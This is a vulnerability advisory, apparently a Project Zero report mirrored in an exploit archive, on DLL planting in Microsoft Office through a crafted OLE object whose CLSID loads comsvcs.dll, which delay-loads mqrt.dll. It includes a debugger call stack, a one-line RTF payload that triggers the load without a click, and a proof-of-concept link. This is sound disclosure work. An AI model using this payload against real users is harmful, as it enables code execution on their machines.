@@ -1,0 +1,97 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=556
+
+It is possible for an attacker to execute a DLL planting attack in Microsoft Office 2010 on Windows 7 x86 with a specially crafted OLE object. This attack also works on Office 2013 running on Windows 7 x64. Other platforms were not tested. The attached POC document "planted-mqrt.doc" contains what was originally an embedded Packager object. The CLSID for this object was changed at offset 0x2650 to be {ecabafc9-7f19-11d2-978e-0000f8757e2a} (formatted as pack(">IHHBBBBBBBB")). This object has a InProcServer32 pointing to comsvcs.dll. Specifically the CQueueAdmin object implemented in the dll.
+
+When a user opens this document and single clicks on the icon for foo.txt ole32!OleLoad is invoked on our vulnerable CLSID. This results in a call to a class factory constructor that tries eventually tries to call mqrt!MQGetPrivateComputerInformation. Because mqrt is a delay loaded dll the loader has inserted a stub to call _tailMerge_mqrt_dll on the first call of this function. This results in a kernelbase!LoadLibraryExA call vulnerable to dll planting. If the attached mqrt.dll is placed in the same directory with the planted-mqrt.doc file you should see a popup coming from this DLL being loaded from the current working directory of Word.
+
+It's worth noting that there are several other delay loaded dlls in reachable from comsvcs.dll as well. The full list is:
+
+ADVAPI32.dll
+API_MS_WIN_Service_Management_L1_1_0.dll
+API_MS_WIN_Service_Management_L2_1_0.dll
+API_MS_WIN_Service_winsvc_L1_1_0.dll
+API_MS_Win_Security_SDDL_L1_1_0.dll
+CLBCatQ.DLL
+CRYPTSP.dll
+MTXCLU.DLL
+ODBC32.dll
+VERSION.dll
+XOLEHLP.dll
+colbact.DLL
+dbghelp.dll
+mqrt.dll
+netutils.dll
+samcli.dll
+
+Here is the call stack from the delay loaded mqrt.dll:
+
+0:000> kb
+ChildEBP RetAddr  Args to Child              
+001b7cb4 76f15d1c 76f30924 00000460 ffffffff ntdll!KiFastSystemCallRet
+001b7cb8 76f30924 00000460 ffffffff 001b7da0 ntdll!ZwMapViewOfSection+0xc
+001b7d0c 76f3099a 00000460 00000000 00000000 ntdll!LdrpMapViewOfSection+0xc7
+001b7da4 76f2fec4 001b7df0 001b7f00 00000000 ntdll!LdrpFindOrMapDll+0x310
+001b7f24 76f325ea 001b7f84 001b7f50 00000000 ntdll!LdrpLoadDll+0x2b6
+001b7f58 75188c19 003a8aac 001b7f9c 001b7f84 ntdll!LdrLoadDll+0x92
+001b7f94 751890ac 00000000 00000000 003a8aac KERNELBASE!LoadLibraryExW+0x1d9
+001b7fb4 70dd96c0 70e8de20 00000000 00000000 KERNELBASE!LoadLibraryExA+0x26
+001b8000 70e7cb2b 00000000 70e94148 003768a0 comsvcs!__delayLoadHelper2+0x59
+001b8054 70e7588e 70ea52ec 5160c47e 8007000e comsvcs!_tailMerge_mqrt_dll+0xd
+001b8088 70e75c09 069d8cf8 70dd31ac 5160c442 comsvcs!CMSMQRT::Load+0x3a
+001b8090 70dd31ac 5160c442 00000000 001b8114 comsvcs!CQueueAdmin::FinalConstruct+0xa
+001b80b4 70dd47ef 00000000 001b9880 069d8cf8 comsvcs!ATL::CComCreator<ATL::CComObject<CQueueAdmin> >::CreateInstance+0x50
+001b80c8 70dc7d08 00000000 001b9880 001b8114 comsvcs!ATL::CComCreator2<ATL::CComCreator<ATL::CComObject<CQueueAdmin> >,ATL::CComFailCreator<-2147221232> >::CreateInstance+0x18
+001b80e0 765e8c86 06988358 00000000 001b9880 comsvcs!ATL::CComClassFactory::CreateInstance+0x3b
+001b8168 76603170 76706444 00000000 001b94e4 ole32!CServerContextActivator::CreateInstance+0x172 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1000]
+001b81a8 765e8daa 001b94e4 00000000 00414230 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+001b81fc 767602f1 7670646c 00000000 001b94e4 ole32!CApartmentActivator::CreateInstance+0x112 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 2268]
+001b8220 767c6311 765e8d36 001b8410 00000004 RPCRT4!Invoke+0x2a
+001b8628 766fd7e6 06a70490 0678a6e8 067982b8 RPCRT4!NdrStubCall2+0x2d6
+001b8670 766fd876 06a70490 067982b8 0678a6e8 ole32!CStdStubBuffer_Invoke+0xb6 [d:\w7rtm\com\rpc\ndrole\stub.cxx @ 1590]
+001b86b8 766fddd0 067982b8 003a877c 00000000 ole32!SyncStubInvoke+0x3c [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1187]
+001b8704 76618a43 067982b8 06979020 06a70490 ole32!StubInvoke+0xb9 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1396]
+001b87e0 76618938 0678a6e8 00000000 06a70490 ole32!CCtxComChnl::ContextInvoke+0xfa [d:\w7rtm\com\ole32\com\dcomrem\ctxchnl.cxx @ 1262]
+001b87fc 766fa44c 067982b8 00000001 06a70490 ole32!MTAInvoke+0x1a [d:\w7rtm\com\ole32\com\dcomrem\callctrl.cxx @ 2105]
+001b882c 766fdb41 d0908070 0678a6e8 06a70490 ole32!AppInvoke+0xab [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1086]
+001b890c 766fe1fd 06798260 003d6098 00000000 ole32!ComInvokeWithLockAndIPID+0x372 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1724]
+001b8934 76619367 06798260 00000000 06798260 ole32!ComInvoke+0xc5 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1469]
+001b8948 766fe356 06798260 06798260 0039d408 ole32!ThreadDispatch+0x23 [d:\w7rtm\com\ole32\com\dcomrem\chancont.cxx @ 298]
+001b895c 766fe318 06798260 001b8a64 00000000 ole32!DispatchCall+0x27 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 4273]
+001b8988 766fcef0 001b8a50 001b8b78 0697fd00 ole32!CRpcChannelBuffer::SwitchAptAndDispatchCall+0xa1 [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 4321]
+001b8a68 765f9d01 0697fd00 001b8b78 001b8b60 ole32!CRpcChannelBuffer::SendReceive2+0xef [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 4076]
+001b8ae4 765f9b24 0697fd00 001b8b78 001b8b60 ole32!CAptRpcChnl::SendReceive+0xaf [d:\w7rtm\com\ole32\com\dcomrem\callctrl.cxx @ 603]
+001b8b38 766fce06 0697fd00 001b8b78 001b8b60 ole32!CCtxComChnl::SendReceive+0x1c5 [d:\w7rtm\com\ole32\com\dcomrem\ctxchnl.cxx @ 734]
+001b8b54 7675476e 06a39d34 001b8ba4 767c6753 ole32!NdrExtpProxySendReceive+0x49 [d:\w7rtm\com\rpc\ndrole\proxy.cxx @ 1932]
+001b8b60 767c6753 7a61ad54 001b8fb0 0700022b RPCRT4!NdrpProxySendReceive+0xe
+001b8f78 766fc8e2 7660fa10 7661484a 001b8fb0 RPCRT4!NdrClientCall2+0x1a6
+001b8f98 765f98ad 00000014 00000004 001b8fc8 ole32!ObjectStublessClient+0xa2 [d:\w7rtm\com\rpc\ndrole\i386\stblsclt.cxx @ 474]
+001b8fa8 765e8d1f 06a39d34 00000000 001b94e4 ole32!ObjectStubless+0xf [d:\w7rtm\com\rpc\ndrole\i386\stubless.asm @ 154]
+001b8fc8 765e8aa2 76706494 00000001 00000000 ole32!CProcessActivator::CCICallback+0x6d [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1737]
+001b8fe8 765e8a53 76706494 001b9340 00000000 ole32!CProcessActivator::AttemptActivation+0x2c [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1630]
+001b9024 765e8e0d 76706494 001b9340 00000000 ole32!CProcessActivator::ActivateByContext+0x4f [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1487]
+001b904c 76603170 76706494 00000000 001b94e4 ole32!CProcessActivator::CreateInstance+0x49 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1377]
+001b908c 76602ef4 001b94e4 00000000 001b9a50 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+001b92ec 76603170 76706448 00000000 001b94e4 ole32!CClientContextActivator::CreateInstance+0xb0 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 685]
+001b932c 76603098 001b94e4 00000000 001b9a50 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+001b9b04 76609e25 001b9c20 00000000 00000403 ole32!ICoCreateInstanceEx+0x404 [d:\w7rtm\com\ole32\com\objact\objact.cxx @ 1334]
+001b9b64 76609d86 001b9c20 00000000 00000403 ole32!CComActivator::DoCreateInstance+0xd9 [d:\w7rtm\com\ole32\com\objact\immact.hxx @ 343]
+001b9b88 76609d3f 001b9c20 00000000 00000403 ole32!CoCreateInstanceEx+0x38 [d:\w7rtm\com\ole32\com\objact\actapi.cxx @ 157]
+001b9bb8 7662154c 001b9c20 00000000 00000403 ole32!CoCreateInstance+0x37 [d:\w7rtm\com\ole32\com\objact\actapi.cxx @ 110]
+001b9c34 7661f2af ecabafc9 11d27f19 00008e97 ole32!wCreateObject+0x106 [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 3046]
+001b9c98 7661f1d4 053d0820 00000000 605c63a8 ole32!OleLoadWithoutBinding+0x9c [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 1576]
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Common Files\Microsoft Shared\office14\mso.dll - 
+001b9cc0 5eb283bf 053d0820 605c63a8 02397a00 ole32!OleLoad+0x37 [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 1495]
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\Office14\wwlib.dll - 
+WARNING: Stack unwind information not available. Following frames may be wrong.
+001b9d34 60a53973 053d0820 605c63a8 02397a00 mso!Ordinal2023+0x7c
+001b9d80 60a53881 036dc800 053d0820 605c63a8 wwlib!DllGetLCID+0x46e24d
+
+
+It is also possible to trigger this DLL load without requiring a user click by using the following RTF document:
+
+{\rtf1{\object\objemb{\*\objclass None}{\*\oleclsid \'7becabafc9-7f19-11d2-978e-0000f8757e2a\'7d}{\*\objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000}}}
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/38968.zip
+
